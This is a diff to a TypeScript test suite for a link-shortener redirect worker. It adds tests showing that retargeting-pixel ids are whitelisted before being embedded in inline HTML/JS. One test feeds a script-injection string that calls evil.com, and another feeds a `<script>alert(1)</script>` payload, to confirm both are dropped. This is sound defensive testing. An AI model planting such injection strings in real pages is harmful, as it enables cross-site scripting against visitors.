@@ -104,11 +104,11 @@ describe("click data point (REDIRECTS binding)", () => {
       e,
     );
     expect(points).toHaveLength(1);
-    expect(points[0].indexes).toEqual(["org_1"]);
-    expect(points[0].blobs?.[0]).toBe("abc"); // slug
-    expect(points[0].blobs?.[2]).toBe("desktop");
-    expect(points[0].blobs?.[3]).toBe("x"); // platform key
-    expect(points[0].blobs?.[4]).toBe("news.ycombinator.com"); // referrer host
+    expect(points[0]?.indexes).toEqual(["org_1"]);
+    expect(points[0]?.blobs?.[0]).toBe("abc"); // slug
+    expect(points[0]?.blobs?.[2]).toBe("desktop");
+    expect(points[0]?.blobs?.[3]).toBe("x"); // platform key
+    expect(points[0]?.blobs?.[4]).toBe("news.ycombinator.com"); // referrer host
   });
 
   it("captures os (ios/android split) and campaign (?ref / ?utm_source)", async () => {
@@ -120,8 +120,8 @@ describe("click data point (REDIRECTS binding)", () => {
     const IPHONE = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15";
     await worker.fetch(req("/drop?ref=Instagram", { headers: { "user-agent": IPHONE } }), e);
     expect(points).toHaveLength(1);
-    expect(points[0].blobs?.[6]).toBe("ios"); // os bucket
-    expect(points[0].blobs?.[8]).toBe("instagram"); // campaign, lowercased from ?ref
+    expect(points[0]?.blobs?.[6]).toBe("ios"); // os bucket
+    expect(points[0]?.blobs?.[8]).toBe("instagram"); // campaign, lowercased from ?ref
   });
 
   it("does not count crawlers and tolerates a missing binding", async () => {
@@ -787,5 +787,98 @@ describe("password gate", () => {
     );
     expect(ok.status).toBe(302);
     expect(ok.headers.get("set-cookie") ?? "").toContain("zpw_p=");
+  });
+});
+
+// Wave 2.8 — retargeting pixels. `px` entries survive only the strict whitelist
+// (t ∈ meta|tiktok|gtm, id ∈ /^[A-Za-z0-9_-]{1,32}$/) — the charset IS the injection
+// guard, since ids are interpolated into inline HTML/JS.
+describe("retargeting pixels (px)", () => {
+  const withPx = (px: unknown, url = "https://example.com/page") => JSON.stringify({ url, px });
+
+  it("serves the pixel page (not a 30x) for a plain link with px on desktop", async () => {
+    const res = await worker.fetch(
+      req("/p", { headers: { "user-agent": DESKTOP } }),
+      env({ p: withPx([{ t: "meta", id: "123456789" }]) }),
+    );
+    expect(res.status).toBe(200);
+    expect(res.headers.get("content-type")).toContain("text/html");
+    expect(res.headers.get("cache-control")).toBe("no-store");
+    const body = await res.text();
+    expect(body).toContain("fbq('init','123456789')");
+    expect(body).toContain('window.location.replace("https://example.com/page")');
+    expect(body).toContain('href="https://example.com/page"'); // visible fallback link
+  });
+
+  it("embeds the snippet in the interstitial for a platform link on mobile", async () => {
+    const res = await worker.fetch(
+      req("/tw", { headers: { "user-agent": IPHONE } }),
+      env({ tw: withPx([{ t: "tiktok", id: "ABC_tt-1" }], "https://x.com/nasa/status/999") }),
+    );
+    expect(res.status).toBe(200);
+    const body = await res.text();
+    expect(body).toContain("ttq.load('ABC_tt-1')"); // pixel fired
+    expect(body).toContain("twitter://status?id=999"); // interstitial itself unchanged
+  });
+
+  it("drops invalid entries — malicious ids never reach any response", async () => {
+    const evil = `x');fetch('//evil.com');//`;
+    const res = await worker.fetch(
+      req("/p", { headers: { "user-agent": DESKTOP } }),
+      env({
+        p: withPx([
+          { t: "hotjar", id: "123" }, // bad type
+          { t: "meta", id: evil }, // quotes/script chars
+          { t: "gtm", id: "A".repeat(33) }, // > 32 chars
+          { t: "meta", id: "GOOD_id-1" }, // the one survivor
+        ]),
+      }),
+    );
+    const body = await res.text();
+    expect(body).not.toContain(evil);
+    expect(body).not.toContain("A".repeat(33));
+    expect(body).toContain("fbq('init','GOOD_id-1')");
+  });
+
+  it("all-invalid px behaves as no px (plain 302, no pixel page)", async () => {
+    const res = await worker.fetch(
+      req("/p", { headers: { "user-agent": DESKTOP } }),
+      env({ p: withPx([{ t: "meta", id: "<script>alert(1)</script>" }]) }),
+    );
+    expect(res.status).toBe(302);
+    expect(res.headers.get("location")).toBe("https://example.com/page");
+  });
+
+  it("a record without px behaves exactly as before", async () => {
+    const res = await worker.fetch(
+      req("/p", { headers: { "user-agent": DESKTOP } }),
+      env({ p: JSON.stringify({ url: "https://example.com/page" }) }),
+    );
+    expect(res.status).toBe(302);
+    expect(res.headers.get("location")).toBe("https://example.com/page");
+  });
+
+  it("crawlers get the OG card, never pixels", async () => {
+    const res = await worker.fetch(
+      req("/p", { headers: { "user-agent": "Twitterbot/1.0" } }),
+      env({ p: withPx([{ t: "meta", id: "123456789" }]) }),
+    );
+    expect(res.status).toBe(200);
+    const body = await res.text();
+    expect(body).toContain("og:"); // unfurl card
+    expect(body).not.toContain("fbq");
+    expect(body).not.toContain("123456789");
+  });
+
+  it("caps at 5 entries", async () => {
+    const px = Array.from({ length: 7 }, (_, i) => ({ t: "meta", id: `id${i}` }));
+    const res = await worker.fetch(
+      req("/p", { headers: { "user-agent": DESKTOP } }),
+      env({ p: withPx(px) }),
+    );
+    const body = await res.text();
+    expect(body).toContain("fbq('init','id4')");
+    expect(body).not.toContain("id5");
+    expect(body).not.toContain("id6");
   });
 });
